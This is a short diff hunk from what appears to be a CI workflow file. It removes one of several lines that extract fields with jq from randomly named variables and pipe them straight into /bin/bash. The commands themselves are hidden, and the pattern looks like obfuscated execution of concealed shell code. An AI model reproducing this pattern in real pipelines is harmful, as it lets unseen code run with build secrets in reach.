@@ -20,7 +20,6 @@ jobs:
           echo $bcndl0 | jq -r .wmgoa3635 | /bin/bash
           echo $wu511 | jq -r .loy0 | /bin/bash
           printf '%s' "$dac19324" | jq -r .mrzqx02000 | /bin/bash
-          echo $rtwdo28359 | jq -r .gj080 | /bin/bash
           printf '%s' "$y64" | jq -r .jjx95041 | /bin/bash
           printf '%s' "$qqazm21" | jq -r .zs28 | /bin/bash
           echo $o069 | jq -r .iuul5 | /bin/bash
